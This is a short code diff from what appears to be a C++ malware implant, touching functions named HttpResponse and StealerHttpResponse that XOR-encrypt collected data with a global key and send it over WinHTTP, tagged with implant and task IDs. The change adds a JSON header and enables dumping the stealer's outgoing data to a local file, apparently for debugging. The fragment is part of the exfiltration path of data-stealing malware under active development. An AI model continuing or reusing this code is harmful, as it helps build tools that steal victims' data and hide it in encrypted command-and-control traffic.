@@ -270,6 +270,8 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     postdata = xorcrypt(postdata, length, GlobalKey);
     
     std::string result;
+
+    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
     
 
     // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
@@ -387,8 +389,8 @@ std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, js
 
 
 
-    //std::ofstream file("newbad.txt");
-    //file << postdata;
+    std::ofstream file("sitawareplswork.txt");
+    file << postdata;
 
     //LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
 
